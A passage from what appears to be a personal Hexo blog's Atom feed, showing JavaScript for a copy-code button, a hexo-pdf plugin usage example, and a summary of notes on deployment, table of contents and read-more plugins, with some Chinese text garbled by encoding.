function_">copyToClipboard</span>(<span class="params">text, callBack</span>) &#123;</span><br><span class="line">    navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(text).<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// fulfillment</span></span><br><span class="line">            <span class="title function_">callBack</span>()</span><br><span class="line">        &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// rejection</span></span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;fail: &quot;</span> + reason)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;.copy&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">copyCode</span>(<span class="variable language_">this</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyCode</span>(<span class="params">element</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (element <span class="keyword">instanceof</span> <span class="title class_">Element</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> elemt = element</span><br><span class="line">        <span class="keyword">while</span>(elemt.<span class="property">tagName</span> != <span class="string">&quot;FIGURE&quot;</span>) &#123;</span><br><span class="line">            elemt = elemt.<span class="property">parentElement</span></span><br><span class="line">        &#125;</span><br><span class="line">        elemt = elemt.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> text =elemt.<span class="property">innerText</span></span><br><span class="line">        </span><br><span class="line">        <span class="title function_">copyToClipboard</span>(text, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> node = $(element.<span class="property">childNodes</span>[<span class="number">0</span>])</span><br><span class="line">            node.<span class="title function_">attr</span>(<span class="string">&#x27;class&#x27;</span>, <span class="string">&quot;fa fa-check&quot;</span>)</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; </span><br><span class="line">                node.<span class="title function_">attr</span>(<span class="string">&#x27;class&#x27;</span>, <span class="string">&quot;fas fa-copy&quot;</span>)</span><br><span class="line">             &#125; ,<span class="number">1000</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hexo-pdf"><a href="#hexo-pdf" class="headerlink" title="hexo-pdf"></a>hexo-pdf</h2><ul><li><a href="https://github.com/superalsrk/hexo-pdf">åœ°å€</a></li></ul><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf ./bash_freshman.pdf %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;git-deplyer&quot;&gt;&lt;a href=&quot;#git-deplyer&quot; class=&quot;headerlink&quot; title=&quot;git deplyer&quot;&gt;&lt;/a&gt;git deplyer&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_43659725/article/details/125207584&quot;&gt;ref&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;æ–‡ç« ç›®å½•&quot;&gt;&lt;a href=&quot;#æ–‡ç« ç›®å½•&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ç« ç›®å½•&quot;&gt;&lt;/a&gt;æ–‡ç« ç›®å½•&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;icarusçš„æ–‡ç« ç›®å½•åªæœ‰äºŒçº§æ ‡é¢˜å¼€å§‹æ‰å¯ä»¥è·³è½¬&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;é˜…è¯»æ›´å¤šæŒ‰é’®&quot;&gt;&lt;a href=&quot;#é˜…è¯»æ›´å¤šæŒ‰é’®&quot; class=&quot;headerlink&quot; title=&quot;é˜…è¯»æ›´å¤šæŒ‰é’®&quot;&gt;&lt;/a&gt;é˜…è¯»æ›´å¤šæŒ‰é’®&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;å®‰è£…&lt;a href=&quot;https://github.com/chekun/hexo-excerpt&quot;&gt;hexo-excerpt&lt;/a&gt;æ’ä»¶&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="misc" scheme="https://jingtianer.github.io/home/categories/misc/"/>
    
    
    <category term="hexo" scheme="https://jingtianer.github.io/home/tags/hexo/"/>
    
  </entry>
  
</feed>
